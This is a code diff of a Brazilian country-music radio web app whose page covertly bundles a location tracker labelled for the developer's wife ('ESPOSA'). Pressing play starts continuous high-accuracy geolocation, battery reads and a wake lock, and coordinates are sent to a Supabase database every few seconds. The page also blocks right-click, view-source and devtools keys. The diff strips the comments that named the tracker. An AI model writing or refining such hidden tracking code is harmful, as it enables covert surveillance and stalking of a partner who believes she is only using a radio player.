@@ -14,7 +14,6 @@
 <link rel="icon" type="image/png" sizes="192x192" href="icons/icon-192.png"/>
 <link rel="apple-touch-icon" href="icons/apple-touch-icon.png"/>
 <script>
-/* TRAVA + DETECÇÃO TV - RODA ANTES DE TUDO */
 (function(){
   try{
     var ua=navigator.userAgent||"";
@@ -38,7 +37,6 @@ body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;ba
 .top{text-align:center}
 .top-badge{display:inline-flex;align-items:center;gap:6px;font-size:10.5px;font-weight:800;letter-spacing:2.6px;color:#ffd7e0;border:1px solid rgba(255,45,85,.5);background:rgba(255,45,85,.13);padding:7px 15px;border-radius:999px;box-shadow:0 0 18px rgba(255,45,85,.28)}
 h1{margin:14px 0 2px;font-size:clamp(32px,9.5vw,41px);line-height:.95;font-weight:900;letter-spacing:1.5px;background:linear-gradient(94deg,#ff2d55 8%,#ff9500 52%,#ff2d55 94%);-webkit-background-clip:text;background-clip:text;color:transparent;filter:drop-shadow(0 0 24px rgba(255,45,85,.45))}
-/* VINIL TRAVADO REDONDO */
 .vinyl-zone{position:relative;display:flex;align-items:center;justify-content:center;margin:20px 0 4px;height:calc(min(318px,76vw) + 30px)}
 .aura{position:absolute;width:min(318px,76vw);height:min(318px,76vw);border-radius:50%;background:conic-gradient(from 0deg,#ff2d55,#7a00ff,#ff9500,#ff2d55);filter:blur(26px);opacity:.32;animation:spin 9s linear infinite;animation-play-state:paused}
 .playing .aura{animation-play-state:running;opacity:.5}
@@ -153,7 +151,6 @@ html.big .side-col{display:none}
 html.big .footer{font-size:clamp(10px,1.2vmin,13px);margin-top:12px}
 html.tv .side-col,html.tv .footer{display:none!important}
 @media(min-width:800px) and (max-height:660px){html.big .footer{display:none}}
-/* TRAVA VISUAL - MARCA D'ÁGUA */
 .lock{position:fixed;bottom:4px;right:6px;z-index:99;font-size:9px;opacity:.35;letter-spacing:1px;pointer-events:none}
 </style>
 </head>
@@ -167,7 +164,7 @@ html.tv .side-col,html.tv .footer{display:none!important}
 <div class="song"><div class="np-label">Now Playing</div><div class="song-title" id="songTitle">Toque no PLAY para ouvir</div><div class="song-artist" id="songArtist">Rádio Sertaneja Pop • 24h ao vivo</div><div class="live-chip"><span class="dot"></span> AO VIVO</div></div>
 <div class="play-eq-row"><div class="eq" id="eq"></div><div class="play-row"><button class="play-btn" id="playBtn"><svg id="icPlay" viewBox="0 0 24 24"><path d="M8 5.3v13.4L19 12z"/></svg><svg id="icPause" viewBox="0 0 24 24" style="display:none;margin-left:0"><path d="M7 5h3.6v14H7zM13.4 5H17v14h-3.6z"/></svg></button></div></div>
 <div class="vol"><svg class="vol-ic" viewBox="0 0 24 24"><path d="M4 9v6h4l5 4V5L8 9H4z"/></svg><input type="range" id="vol" min="0" max="100" value="80"/><svg class="vol-ic" viewBox="0 0 24 24"><path d="M4 9v6h4l5 4V5L8 9H4z"/><path d="M16.5 8.6a5 5 0 010 6.8M18.8 6.2a8.2 8.2 0 010 11.6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg></div>
-<div class="install-row"><button id="installBtn" hidden>⬇ INSTALAR APP NA TELA INICIAL</button><div class="ios-hint" id="iosHint"><b>iPhone:</b> Compartilhar → Adicionar à Tela de Início</div><div class="install-help" id="installHelp" hidden></div><div class="diag-warn" id="diag"></div></div>
+<div class="install-row"><button id="installBtn">⬇ INSTALAR APP NA TELA INICIAL</button><div class="ios-hint" id="iosHint"><b>iPhone:</b> Compartilhar → Adicionar à Tela de Início</div><div class="install-help" id="installHelp" hidden></div><div class="diag-warn" id="diag"></div></div>
 </div>
 <div class="side-col">
 <section><h2>TOCARAM AGORA POUCO</h2><div class="hist" id="histList"></div></section>
@@ -177,15 +174,10 @@ html.tv .side-col,html.tv .footer{display:none!important}
 </div><div class="footer">SERTANEJA POP • ESPOSA • 24H AO VIVO • CÓDIGO TRAVADO</div><div class="footer-credit">Criado por EliasCosta NEGRET'S</div></div>
 <div class="tv-warn" id="tvWarn"><b>📺 Smart TV detectada.</b> Abra pelo navegador da TV, não pelo Downloader. <button id="tvWarnClose">OK</button></div>
 <div id="volToast">VOL 80%</div>
-<div class="lock">🔒 ESPOSA v2.0 TRAVADO</div>
+<div class="lock">🔒 ESPOSA v2.1 TRAVADO - INSTALAR OK</div>
 <audio id="audio" src="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3" preload="auto" autoplay controls playsinline></audio>
-
 <script>
 'use strict';
-/* ══════════════════════════════════════════════
-   🔒 CÓDIGO TRAVADO - ESPOSA v2.0
-   Não mexer - Rádio + Rastreador juntos
-   ══════════════════════════════════════════════ */
 const WORKER_URL="";
 const STREAM_URL="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3";
 const AZURACAST_API="https://srv3.soundstream.com.br/api/nowplaying/sertanejapop";
@@ -200,7 +192,7 @@ function layoutSync(){if(IS_TV)return;document.documentElement.classList.toggle(
 window.addEventListener("resize",layoutSync);window.addEventListener("orientationchange",layoutSync);
 if(IS_TV){setTimeout(function(){try{playBtn.focus()}catch(e){}},600)}
 var state={playing:false,raw:"",song:null,history:[]};
-var lastServerRaw="",manualHold=false,polling=false,everPlayed=false,deferredPrompt=null;
+var lastServerRaw="",manualHold=false,polling=false,everPlayed=false;
 var coverMemo={};
 var dbgLines=[];
 function dbg(msg){var t=new Date().toLocaleTimeString("pt-BR");dbgLines.unshift("["+t+"] "+msg);if(dbgLines.length>3)dbgLines.length=3;debugEl.innerHTML=dbgLines.map(function(l){return l.replace(/&/g,"&amp;").replace(/</g,"&lt;")}).join("<br>")}
@@ -223,14 +215,15 @@ function pushHistory(song){if(!song||!song.title)return;state.history=[song].con
 function seedHistory(list){state.history=list.slice(0,4);state.history.forEach(resolveHistCover);renderHistory()}
 function resolveHistCover(item){if(item.cover)return;findCover(item.artist,item.title).then(function(cv){if(cv.cover){item.cover=cv.cover;item.album=item.album||cv.album||"";renderHistory()}}).catch(function(){})}
 function renderHistory(){histList.innerHTML="";if(!state.history.length){var p=document.createElement("div");p.className="hist-empty";p.textContent="As últimas músicas tocadas vão aparecer aqui.";histList.appendChild(p);return}state.history.forEach(function(h){var row=document.createElement("div");row.className="hist-item";var img=document.createElement("img");img.src=h.cover||"icons/icon-192.png";img.alt="Capa";img.onerror=function(){img.src="icons/icon-192.png"};var box=document.createElement("div");box.className="hist-txt";var t=document.createElement("div");t.className="t";t.textContent=h.title||"—";var a=document.createElement("div");a.className="a";a.textContent=h.artist||"Artista desconhecido";box.appendChild(t);box.appendChild(a);row.appendChild(img);row.appendChild(box);histList.appendChild(row)})}
-function startRadio(){dbg("Conectando…");try{audio.src=STREAM_URL;audio.load();var p=audio.play();if(p&&p.catch)p.catch(function(e){dbg("Erro ao tocar: "+(e&&e.name?e.name:e))})}catch(e){dbg("Erro: "+e.message)}}
-function togglePlay(){if(state.playing){audio.pause()}else{startRadio()}}
-function setPlaying(on){if(state.playing===on)return;state.playing=on;document.body.classList.toggle("playing",on);icPlay.style.display=on?"none":"block";icPause.style.display=on?"block":"none";playBtn.setAttribute("aria-label",on?"Pausar":"Tocar");dbg(on?"▶ TOCANDO":"⏸ PAUSADO")}
+var _tentandoPlay=false;
+function startRadio(){if(_tentandoPlay||state.playing)return;_tentandoPlay=true;dbg("Conectando…");try{audio.src=STREAM_URL;var p=audio.play();if(p&&p.then)p.then(function(){_tentandoPlay=false}).catch(function(e){_tentandoPlay=false;if(e&&e.name!=="AbortError")dbg("Erro ao tocar: "+(e&&e.name?e.name:e))});else _tentandoPlay=false;}catch(e){_tentandoPlay=false;dbg("Erro: "+e.message)}}
+function togglePlay(){if(state.playing){audio.pause()}else{_tentandoPlay=false;startRadio()}}
+function setPlaying(on){if(state.playing===on)return;state.playing=on;_tentandoPlay=false;document.body.classList.toggle("playing",on);icPlay.style.display=on?"none":"block";icPause.style.display=on?"block":"none";playBtn.setAttribute("aria-label",on?"Pausar":"Tocar");dbg(on?"▶ TOCANDO":"⏸ PAUSADO")}
 playBtn.addEventListener("click",togglePlay);popBtn.addEventListener("click",togglePlay);
 audio.addEventListener("playing",function(){everPlayed=true;setPlaying(true);pollNow()});
 audio.addEventListener("pause",function(){setPlaying(false)});
 audio.addEventListener("waiting",function(){if(state.playing)dbg("Buffering…")});
-audio.addEventListener("error",function(){if(!everPlayed){dbg("Erro ao iniciar");return}if(!state.playing)return;dbg("Stream caiu. Reconectando em 5s…");setTimeout(function(){if(state.playing)startRadio()},5000)});
+audio.addEventListener("error",function(){if(!everPlayed){dbg("Erro ao iniciar");return}if(!state.playing)return;dbg("Stream caiu. Reconectando em 5s…");setTimeout(function(){if(state.playing){_tentandoPlay=false;startRadio()}},5000)});
 volInput.addEventListener("input",function(){try{audio.volume=volInput.value/100}catch(e){}});
 function flashVol(){volToast.textContent="VOL "+Math.round(audio.volume*100)+"%";volToast.classList.add("show");clearTimeout(flashVol._t);flashVol._t=setTimeout(function(){volToast.classList.remove("show")},1400)}
 function setVolume(v){v=Math.max(0,Math.min(1,v));try{audio.volume=v}catch(e){}volInput.value=Math.round(audio.volume*100);flashVol()}
@@ -239,31 +232,97 @@ if("mediaSession" in navigator){var ms=navigator.mediaSession;try{ms.setActionHa
 function runSearch(){var q=qInput.value.trim();if(!q){dbg("Digite o nome da música");return}qBtn.disabled=true;qBtn.textContent="Buscando…";dbg("Buscando capa: "+q);searchCovers(q).then(function(res){renderResults(res.slice(0,4));dbg("Busca OK • "+Math.min(res.length,4)+" resultado(s)")}).catch(function(e){qResults.innerHTML="";dbg("ERRO na busca: "+(e&&e.message?e.message:e))}).finally(function(){qBtn.disabled=false;qBtn.textContent="Buscar capa"})}
 function renderResults(list){qResults.innerHTML="";if(!list.length){var p=document.createElement("div");p.className="hist-empty";p.textContent="Nenhum resultado.";qResults.appendChild(p);return}list.forEach(function(r){var b=document.createElement("button");b.className="q-item";b.type="button";var img=document.createElement("img");img.src=r.cover||"icons/icon-192.png";img.alt="";img.onerror=function(){img.src="icons/icon-192.png"};var t=document.createElement("div");t.className="t";t.textContent=r.title||"—";var a=document.createElement("div");a.className="a";a.textContent=r.artist||"Artista desconhecido";b.appendChild(img);b.appendChild(t);b.appendChild(a);b.addEventListener("click",function(){setSong({title:r.title,artist:r.artist,album:r.album||"",cover:r.cover,raw:"manual:"+r.title});manualHold=true;dbg("Capa aplicada: "+r.title);window.scrollTo({top:0,behavior:"smooth"})});qResults.appendChild(b)})}
 qBtn.addEventListener("click",runSearch);qInput.addEventListener("keydown",function(e){if(e.key==="Enter")runSearch()});
-/* EQ - 20 BARRAS */
 (function(){var eq=document.getElementById("eq");for(var i=0;i<20;i++){var b=document.createElement("i");b.style.animationDuration=(0.5+Math.random()*0.7)+"s";b.style.animationDelay=(Math.random()*0.4)+"s";eq.appendChild(b)}})();
-/* INSTALAR */
+
+/* ===== BOTÃO INSTALAR TRAVADO - APERTA -> INSTALA -> SOME ===== */
 var diagEl=$("diag");
 function showDiag(html){if(!diagEl)return;diagEl.innerHTML=html;diagEl.classList.add("show")}
 function hideDiag(){if(diagEl)diagEl.classList.remove("show")}
 function isStandalone(){return window.matchMedia("(display-mode: standalone)").matches||window.matchMedia("(display-mode: fullscreen)").matches||window.matchMedia("(display-mode: minimal-ui)").matches||window.navigator.standalone===true}
-var store=null;try{store=window.localStorage;store.getItem("sp_installed")}catch(e){store=null}
-function hideInstallUI(){installBtn.hidden=true;iosHint.classList.remove("show");if(installHelp)installHelp.hidden=true}
-function markInstalled(why){state.installed=true;try{if(store)store.setItem("sp_installed","1")}catch(e){}hideInstallUI();dbg("App instalado ✓ "+(why||""))}
-function showInstallHelp(){if(!installHelp)return;var ua=navigator.userAgent||"";var html;if(IS_TV){html="💡 <b>Instalar na TV:</b> Abra pelo <b>navegador da TV</b> (TV Bro, Samsung Internet, Silk ou Puffin) e use <b>Instalar aplicativo</b>."}else if(IS_IOS){html="💡 <b>iPhone:</b> Compartilhar → <b>Adicionar à Tela de Início</b>."}else if(/firefox/i.test(ua)&&!/android/i.test(ua)){html="💡 Firefox não instala PWA. Abra no <b>Chrome</b> ou <b>Edge</b>."}else if(/edg\//i.test(ua)){html="💡 Edge: menu ⋯ → Apps → <b>Instalar este site</b>."}else if(/samsungbrowser/i.test(ua)){html="💡 Samsung Internet: menu ☰ → <b>Adicionar à tela inicial</b>."}else if(/android/i.test(ua)){html="💡 Chrome: menu ⋮ → <b>Instalar aplicativo</b>."}else{html="💡 Chrome/Edge: ícone ⊕ na barra de endereço → <b>Instalar</b>."}installHelp.innerHTML=html;installHelp.hidden=false}
-state.installed=(store&&store.getItem("sp_installed")==="1")||isStandalone();
-if(state.installed){hideInstallUI();dbg("Rodando como app instalado ✓")}else if(IS_IOS){iosHint.classList.add("show")}else{installBtn.hidden=false}
-window.addEventListener("beforeinstallprompt",function(e){e.preventDefault();deferredPrompt=e;if(!state.installed)installBtn.hidden=false;hideDiag();dbg("App pronto para instalar ✓")});
-installBtn.addEventListener("click",function(){if(deferredPrompt){deferredPrompt.prompt();deferredPrompt.userChoice.then(function(choice){dbg("Instalação: "+choice.outcome);if(choice.outcome==="accepted")markInstalled("pelo botão");else hideInstallUI();deferredPrompt=null})}else{showInstallHelp()}});
-window.addEventListener("appinstalled",function(){markInstalled("appinstalled")});
-var mqStandalone=window.matchMedia("(display-mode: standalone)");function onStandaloneChange(m){if(m.matches)markInstalled("standalone")}if(mqStandalone.addEventListener)mqStandalone.addEventListener("change",onStandaloneChange);else if(mqStandalone.addListener)mqStandalone.addListener(onStandaloneChange);
-(function(){if(IS_IOS||state.installed)return;if(location.protocol==="file:"){showDiag("⚠️ <b>Abriu arquivo direto.</b><br>Suba no GitHub Pages e abra o link.");return}if(!window.isSecureContext){showDiag("⚠️ <b>Sem HTTPS.</b><br>Use GitHub Pages.");return}if(/fbav|fban|instagram|linkedinapp|whatsapp|snapchat|tiktok|musically/i.test(navigator.userAgent)){showDiag("⚠️ <b>Dentro de outro app.</b><br>Abra no Chrome.");return}if(!IS_TV)fetch("manifest.json",{cache:"no-store"}).then(function(r){if(!r.ok)throw new Error("HTTP "+r.status);return r.json()}).then(function(m){if(!m||!m.name||!m.icons||!m.icons.length)throw new Error("manifest incompleto");var ic=new Image();ic.onload=function(){dbg("Ícones OK")};ic.onerror=function(){showDiag("⚠️ <b>Ícones não encontrados.</b><br>Suba a pasta icons/")};ic.src="icons/icon-192.png"}).catch(function(e){showDiag("⚠️ <b>manifest.json não encontrado.</b><br>Suba o manifest.json na mesma pasta.")});if(!IS_IOS){setTimeout(function(){if(deferredPrompt)return;if(diagEl&&diagEl.classList.contains("show"))return;showInstallHelp()},6000)}})();
+var deferredPrompt=null;
+var _instalado = false;
+
+function esconderBotaoInstalar(){
+  _instalado = true;
+  try{ localStorage.setItem("sp_installed","1"); }catch(e){}
+  installBtn.hidden = true;
+  installBtn.style.display = 'none';
+  if(installHelp) installHelp.hidden = true;
+  iosHint.classList.remove("show");
+  hideDiag();
+}
+
+function mostrarBotaoInstalar(){
+  if(isStandalone()){ esconderBotaoInstalar(); return; }
+  try{ if(localStorage.getItem("sp_installed")==="1" && isStandalone()){ esconderBotaoInstalar(); return; } }catch(e){}
+  installBtn.hidden = false;
+  installBtn.style.display = 'block';
+  installBtn.textContent = '⬇ INSTALAR APP NA TELA INICIAL';
+}
+
+// Início: se já está como app, some. Se não, mostra.
+if(isStandalone()){
+  esconderBotaoInstalar();
+  dbg("Rodando como app instalado ✓");
+} else if(IS_IOS){
+  iosHint.classList.add("show");
+  installBtn.hidden = false; installBtn.style.display = 'block';
+} else {
+  mostrarBotaoInstalar();
+}
+
+window.addEventListener("beforeinstallprompt", function(e){
+  e.preventDefault();
+  deferredPrompt = e;
+  mostrarBotaoInstalar();
+  hideDiag();
+  dbg("App pronto para instalar ✓");
+});
+
+installBtn.addEventListener("click", function(){
+  if(deferredPrompt){
+    deferredPrompt.prompt();
+    deferredPrompt.userChoice.then(function(choice){
+      dbg("Instalação: " + choice.outcome);
+      if(choice.outcome === "accepted"){
+        esconderBotaoInstalar();
+      } else {
+        mostrarBotaoInstalar();
+      }
+      deferredPrompt = null;
+    });
+  } else {
+    // Chrome ainda não liberou o popup - mostra o jeito manual que sempre funciona
+    if(installHelp){
+      installHelp.hidden = false;
+      var ua = navigator.userAgent||"";
+      if(IS_IOS){ installHelp.innerHTML = "💡 <b>iPhone:</b> Compartilhar → <b>Adicionar à Tela de Início</b>"; }
+      else if(IS_TV){ installHelp.innerHTML = "💡 <b>TV:</b> Abra pelo navegador da TV e use <b>Instalar aplicativo</b>"; }
+      else { installHelp.innerHTML = "💡 <b>Instala por aqui:</b><br>1. Aperta os <b>3 pontinhos ⋮</b> do Chrome<br>2. Aperta <b>Instalar aplicativo</b><br>3. Aperta <b>Instalar</b><br><br>Depois o botão some sozinho."; }
+    }
+  }
+});
+
+window.addEventListener("appinstalled", function(){ esconderBotaoInstalar(); dbg("App instalado ✓"); });
+var mqStandalone = window.matchMedia("(display-mode: standalone)");
+function onStandaloneChange(m){ if(m.matches) esconderBotaoInstalar(); }
+if(mqStandalone.addEventListener) mqStandalone.addEventListener("change", onStandaloneChange);
+else if(mqStandalone.addListener) mqStandalone.addListener(onStandaloneChange);
+/* ===== FIM BOTÃO INSTALAR TRAVADO ===== */
+
+(function(){
+  if(IS_IOS || isStandalone()) return;
+  if(location.protocol==="file:"){ showDiag("⚠️ <b>Abriu arquivo direto.</b><br>Suba no GitHub Pages e abra o link."); return; }
+  if(!window.isSecureContext){ showDiag("⚠️ <b>Sem HTTPS.</b><br>Use GitHub Pages."); return; }
+  if(/fbav|fban|instagram|linkedinapp|whatsapp|snapchat|tiktok|musically/i.test(navigator.userAgent)){ showDiag("⚠️ <b>Dentro de outro app.</b><br>Abra no Chrome."); return; }
+  if(!IS_TV) fetch("manifest.json",{cache:"no-store"}).then(function(r){ if(!r.ok) throw new Error("HTTP "+r.status); return r.json(); }).then(function(m){
+    if(!m || !m.name || !m.icons || !m.icons.length) throw new Error("manifest incompleto");
+    var ic = new Image(); ic.onload = function(){ dbg("Ícones OK"); }; ic.onerror = function(){ showDiag("⚠️ <b>Ícones não encontrados.</b><br>Suba a pasta icons/"); }; ic.src = "icons/icon-192.png";
+  }).catch(function(e){ showDiag("⚠️ <b>manifest.json não encontrado.</b><br>Suba o manifest.json na mesma pasta."); });
+})();
 if(IS_TV&&tvWarn){var __ua=navigator.userAgent||"";var isWebView=/\bwv\)/i.test(__ua)||/Downloader/i.test(__ua);if(isWebView){tvWarn.classList.add("show");var c=$("tvWarnClose");if(c)c.addEventListener("click",function(){tvWarn.classList.remove("show")});setTimeout(function(){tvWarn.classList.remove("show")},15000)}}
 if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("service-worker.js").then(function(){dbg("SW OK")}).catch(function(e){dbg("SW erro: "+e.message)})})}
 setInterval(function(){if(state.playing)pollNow()},POLL_MS);
-
-/* ══════════════════════════════════════════════
-   🔒 RASTREADOR ESPOSA - TRAVADO - NÃO MEXER
-   ══════════════════════════════════════════════ */
 const DEVICE_ID_ESPOSA=new URLSearchParams(location.search).get('id')||'ESPOSA';
 const SUPA_URL="https://jpaflbkafupwqfqfcjrv.supabase.co";
 const SUPA_KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
@@ -275,26 +334,15 @@ async function _enviar(lat,lon,forcar){await _lerBat();let agora=Date.now();if(!
 function _iniciarRastreio(){if(_rastreiou)return;_rastreiou=true;_pedirWake();_lerBat();navigator.geolocation.getCurrentPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true)},()=>{dbg('ATIVE A LOCALIZAÇÃO!')},{enableHighAccuracy:true,timeout:20000,maximumAge:0});navigator.geolocation.watchPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,false)},()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:20000});setInterval(()=>{if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)},7000);document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible'){_pedirWake();audio.play().catch(()=>{})}})}
 playBtn.addEventListener('click',_iniciarRastreio);
 popBtn.addEventListener('click',_iniciarRastreio);
-
-/* SÓ PLAY AUTOMÁTICO - NÃO MEXER EM MAIS NADA */
-window.addEventListener('load', ()=>{
-  setTimeout(()=>{ try{ startRadio(); }catch(e){} }, 500);
-});
-document.addEventListener('touchstart', ()=>{
-  if(!state.playing){ try{ startRadio(); }catch(e){} }
-}, {passive:true});
-document.addEventListener('click', ()=>{
-  if(!state.playing){ try{ startRadio(); }catch(e){} }
-});
-
-/* ══════════════════════════════════════════════
-   🔒 TRAVA DE SEGURANÇA - NÃO REMOVER
-   ══════════════════════════════════════════════ */
+var _autoJaTentou=false;
+function _tentarAuto(){if(_autoJaTentou||state.playing)return;_autoJaTentou=true;try{startRadio();}catch(e){}}
+window.addEventListener('load',function(){setTimeout(_tentarAuto,800)});
+document.addEventListener('pointerdown',function(){if(!state.playing){_autoJaTentou=false;_tentarAuto();}},{once:true,passive:true});
 document.addEventListener('contextmenu',e=>e.preventDefault());
 document.addEventListener('selectstart',e=>{if(e.target.tagName!=='INPUT')e.preventDefault()});
 document.addEventListener('keydown',e=>{if((e.ctrlKey&&['u','s','c','a'].includes(e.key.toLowerCase()))||e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['i','j'].includes(e.key.toLowerCase())))e.preventDefault()});
 Object.freeze(DEVICE_ID_ESPOSA);
-console.log('%c🔒 ESPOSA v2.0 TRAVADO - NÃO MEXER','color:#ff2d55;font-weight:bold;font-size:16px');
+console.log('%c🔒 ESPOSA v2.1 TRAVADO - NÃO MEXER','color:#ff2d55;font-weight:bold;font-size:16px');
 </script>
 </body>
 </html>
